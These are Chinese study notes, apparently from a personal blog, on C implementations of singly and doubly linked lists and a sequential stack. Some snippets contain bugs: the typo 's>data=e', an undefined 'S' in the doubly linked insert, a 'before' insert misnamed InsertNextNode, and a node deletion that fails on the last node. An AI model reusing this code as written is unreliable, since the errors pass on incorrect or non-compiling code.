<p><img src="/article/C:/Users/罗思远/AppData/Roaming/Typora/typora-user-images/image-20241014235304529.png" alt="image-20241014235304529"></p>
<h2 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h2><h3 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h3><h4 id="表的定义-1"><a href="#表的定义-1" class="headerlink" title="表的定义"></a>表的定义</h4><h5 id="不带头结点类型"><a href="#不带头结点类型" class="headerlink" title="不带头结点类型"></a>不带头结点类型</h5><p>定义LNode结构体并且使用别名<code>LNode</code>, <code>*LinkList</code>，其实就是为了区别表示的意思是结点还是指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span>        </span><br><span class="line">	<span class="type">int</span> data;				<span class="comment">//数据域 </span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span>     <span class="comment">//指针域</span></span><br><span class="line">&#125;LNode, *LinkList;          </span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">	L=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	LinkList L;</span><br><span class="line">	InitList(L);</span><br><span class="line">   	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="带头结点类型"><a href="#带头结点类型" class="headerlink" title="带头结点类型"></a>带头结点类型</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitList</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">	L=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));   <span class="comment">//分配头结点 </span></span><br><span class="line">	<span class="keyword">if</span>(L==<span class="literal">NULL</span>)&#123;                       <span class="comment">//内存不够分配失败 </span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	LinkList L;</span><br><span class="line">	InitList(L);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="表的基本操作-1"><a href="#表的基本操作-1" class="headerlink" title="表的基本操作"></a>表的基本操作</h4><h5 id="插入元素-1"><a href="#插入元素-1" class="headerlink" title="插入元素"></a>插入元素</h5><h6 id="按位序插入"><a href="#按位序插入" class="headerlink" title="按位序插入"></a>按位序插入</h6><p><strong>带头结点类型</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L, <span class="type">int</span> i, <span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;  </span><br><span class="line">	LNode *p;                  <span class="comment">//指针p指向当前扫描结点</span></span><br><span class="line">	<span class="type">int</span> j=<span class="number">0</span>;                   <span class="comment">//当前p指向第几个结点 </span></span><br><span class="line">	p=L;                       <span class="comment">//指向头结点</span></span><br><span class="line">	<span class="keyword">while</span>(p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;   <span class="comment">//循环找到第i-1个结点</span></span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		j++;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">	s-&gt;data=e;</span><br><span class="line">	s-&gt;next=p-&gt;next;</span><br><span class="line">	p-&gt;next=s;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>不带头结点类型</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListInsert</span><span class="params">(LinkList &amp;L, <span class="type">int</span> i, <span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(i==<span class="number">1</span>)&#123;</span><br><span class="line">		LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">		s&gt;data=e;</span><br><span class="line">		s-&gt;next=L;</span><br><span class="line">		L=s;                    <span class="comment">//将头指针指向新结点</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LNode *p;                   <span class="comment">//指针p指向当前扫描结点</span></span><br><span class="line">	<span class="type">int</span> j=<span class="number">0</span>;                    <span class="comment">//当前p指向第几个结点 </span></span><br><span class="line">	p=L;                        <span class="comment">//指向头结点</span></span><br><span class="line">	<span class="keyword">while</span>(p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		j++;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">	s-&gt;data=e;</span><br><span class="line">	s-&gt;next=p-&gt;next;</span><br><span class="line">	p-&gt;next=s;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<h6 id="指定结点的后插操作"><a href="#指定结点的后插操作" class="headerlink" title="指定结点的后插操作"></a>指定结点的后插操作</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InsertNextNode</span><span class="params">(LNode *p, <span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">	<span class="keyword">if</span>(s==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	s-&gt;data=e;</span><br><span class="line">	s-&gt;next=p-&gt;next;</span><br><span class="line">	p-&gt;next=s;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="指定结点的前插操作"><a href="#指定结点的前插操作" class="headerlink" title="指定结点的前插操作"></a>指定结点的前插操作</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InsertNextNode</span><span class="params">(LNode *p, <span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LNode *s=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">	<span class="keyword">if</span>(s==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	s-&gt;next=p-&gt;next;</span><br><span class="line">	p-&gt;next=s;</span><br><span class="line">    s-&gt;data=p-&gt;data;          <span class="comment">//将p的data值复制到s</span></span><br><span class="line">    p-&gt;data=e;                <span class="comment">//将e的值覆盖到p的data</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="删除元素-1"><a href="#删除元素-1" class="headerlink" title="删除元素"></a>删除元素</h5><h6 id="按位序删除-带头结点"><a href="#按位序删除-带头结点" class="headerlink" title="按位序删除(带头结点)"></a>按位序删除(带头结点)</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">ListDelete</span><span class="params">(LinkList &amp;L, <span class="type">int</span> i, <span class="type">int</span> &amp;e)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LNode *p;</span><br><span class="line">	<span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">	p=L;</span><br><span class="line">	<span class="keyword">while</span>(p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i<span class="number">-1</span>)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		j++; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(p-&gt;next==<span class="literal">NULL</span>)&#123;       <span class="comment">//第i-1个结点后无其他结点 </span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LNode *q=p-&gt;next;</span><br><span class="line">	e=q-&gt;data;</span><br><span class="line">	p-&gt;next=q-&gt;next;</span><br><span class="line">	<span class="built_in">free</span>(q);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="指定结点删除"><a href="#指定结点删除" class="headerlink" title="指定结点删除"></a>指定结点删除</h6><p>算法思想就是先指定q指针指向删除结点的后一结点，继续将指定删除的结点与其后一结点的数据域交换，然后删除节点的指针域赋值为后一结点的指针域，最后释放指针q</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeleteNode</span><span class="params">(LNode *p)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LNode *q=p-&gt;next;</span><br><span class="line">	p-&gt;data=p-&gt;next-&gt;data;</span><br><span class="line">	p-&gt;next=q-&gt;next;</span><br><span class="line">	<span class="built_in">free</span>(q);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="查找结点"><a href="#查找结点" class="headerlink" title="查找结点"></a>查找结点</h5><h6 id="按位查找-带头结点"><a href="#按位查找-带头结点" class="headerlink" title="按位查找(带头结点)"></a>按位查找(带头结点)</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回第i个结点指针</span></span><br><span class="line">LNode *  <span class="title function_">GetElem</span><span class="params">(LinkList L, <span class="type">int</span> i)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(i&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	LNode *p;  <span class="comment">//指针p指向当前扫描结点 </span></span><br><span class="line">	<span class="type">int</span> j=<span class="number">0</span>;   <span class="comment">//当前p指向的结点 </span></span><br><span class="line">	p=L;</span><br><span class="line">	<span class="keyword">while</span>(p!=<span class="literal">NULL</span> &amp;&amp; j&lt;i)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		j++;</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="按值查找-带头结点"><a href="#按值查找-带头结点" class="headerlink" title="按值查找(带头结点)"></a>按值查找(带头结点)</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line">LNode * <span class="title function_">LocateElem</span><span class="params">(LinkList L,<span class="type">int</span> e)</span>&#123;</span><br><span class="line">	<span class="comment">//头结点不存放数据，直接指向头结点下一结点 </span></span><br><span class="line">	LNode *p=L-&gt;next;               </span><br><span class="line">	<span class="keyword">while</span>(p!=<span class="literal">NULL</span> &amp;&amp; p-&gt;data!=e)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="求表的长度"><a href="#求表的长度" class="headerlink" title="求表的长度"></a>求表的长度</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">LengthList</span><span class="params">(LinkList L)</span>&#123;</span><br><span class="line">	<span class="type">int</span> len=<span class="number">0</span>;</span><br><span class="line">	LNode *p;</span><br><span class="line">	p=L;</span><br><span class="line">	<span class="keyword">while</span>(p-&gt;next!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">		p=p-&gt;next;</span><br><span class="line">		len++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="表的建立"><a href="#表的建立" class="headerlink" title="表的建立"></a>表的建立</h5><h6 id="尾插法"><a href="#尾插法" class="headerlink" title="尾插法"></a>尾插法</h6><p>算法思想是设置了头指针和尾指针，这样可以使时间复杂度O降低</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line"><span class="comment">//正向建立单链表 </span></span><br><span class="line">LinkList <span class="title function_">List_TailInsert</span><span class="params">(LinkList &amp;L)</span>&#123;   </span><br><span class="line">	<span class="type">int</span> x;</span><br><span class="line">	L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));    <span class="comment">//建立头结点 </span></span><br><span class="line">	LNode *s,*r=L;                        <span class="comment">//r为表尾指针 </span></span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	<span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;                       <span class="comment">//输入9999退出循环</span></span><br><span class="line">		s=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));  <span class="comment">//申请新结点 </span></span><br><span class="line">		s-&gt;data=x;</span><br><span class="line">		r-&gt;next=s;</span><br><span class="line">		r=s;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x); </span><br><span class="line">	&#125;</span><br><span class="line">	r-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	LinkList L;</span><br><span class="line">	LinkList <span class="built_in">list</span>=List_TailInsert(L);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">LNode</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;LNode,*LinkList;</span><br><span class="line"></span><br><span class="line">LinkList <span class="title function_">List_HeadInsert</span><span class="params">(LinkList &amp;L)</span>&#123;</span><br><span class="line">	LNode *s;</span><br><span class="line">	<span class="type">int</span> x=<span class="number">0</span>;</span><br><span class="line">	L=(LinkList)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">	L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	<span class="keyword">while</span>(x!=<span class="number">9999</span>)&#123;</span><br><span class="line">		s=(LNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(LNode));</span><br><span class="line">		s-&gt;data=x;</span><br><span class="line">		s-&gt;next=L-&gt;next;</span><br><span class="line">		L-&gt;next=s;</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;x);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="双链表"><a href="#双链表" class="headerlink" title="双链表"></a>双链表</h3><h4 id="表的定义-2"><a href="#表的定义-2" class="headerlink" title="表的定义"></a>表的定义</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;DNode,*DLinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InitDLinkList</span><span class="params">(DLinkList &amp;L)</span>&#123;</span><br><span class="line">	L=(DNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DNode));</span><br><span class="line">	<span class="keyword">if</span>(L==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	L-&gt;prior=<span class="literal">NULL</span>;</span><br><span class="line">	L-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	DLinkList L;</span><br><span class="line">	InitDLinkList(L);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="表的基本操作-2"><a href="#表的基本操作-2" class="headerlink" title="表的基本操作"></a>表的基本操作</h4><h5 id="表的插入"><a href="#表的插入" class="headerlink" title="表的插入"></a>表的插入</h5><h6 id="后插入结点"><a href="#后插入结点" class="headerlink" title="后插入结点"></a>后插入结点</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;DNode,*DLinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">InsertNextDNode</span><span class="params">(DNode *p, DNode *s)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span> || S==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	s-&gt;next=p-&gt;next;</span><br><span class="line">	<span class="keyword">if</span>(p-&gt;next!=<span class="literal">NULL</span>)&#123;    <span class="comment">//如果p结点有后继节点 </span></span><br><span class="line">		p-&gt;next-&gt;prior=s;  </span><br><span class="line">	&#125;</span><br><span class="line">	s-&gt;prior=p;</span><br><span class="line">	p-&gt;next=s;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="表的删除"><a href="#表的删除" class="headerlink" title="表的删除"></a>表的删除</h5><h6 id="删除后继结点"><a href="#删除后继结点" class="headerlink" title="删除后继结点"></a>删除后继结点</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">DNode</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">DNode</span> *<span class="title">prior</span>,*<span class="title">next</span>;</span></span><br><span class="line">&#125;DNode,*DLinkList;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">DeleteNextDNode</span><span class="params">(DNode *p)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(p==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	DNode *q=p-&gt;next;     <span class="comment">//找到p的后继结点</span></span><br><span class="line">	<span class="keyword">if</span>(q==<span class="literal">NULL</span>)&#123;          <span class="comment">//无后继结点 </span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	p-&gt;next=q-&gt;next;</span><br><span class="line">	<span class="keyword">if</span>(q-&gt;next!=<span class="literal">NULL</span>)&#123;    <span class="comment">//q结点不是最后一个结点 </span></span><br><span class="line">		q-&gt;next-&gt;prior=p;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(q);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h2 id="顺序栈"><a href="#顺序栈" class="headerlink" title="顺序栈"></a>顺序栈</h2><h3 id="栈的定义"><a href="#栈的定义" class="headerlink" title="栈的定义"></a>栈的定义</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">	<span class="type">int</span> data[MaxSize];</span><br><span class="line">	<span class="type">int</span> top;</span><br><span class="line">&#125;SqStack;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitStack</span><span class="params">(SqStack &amp;S)</span>&#123;</span><br><span class="line">	S.top=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

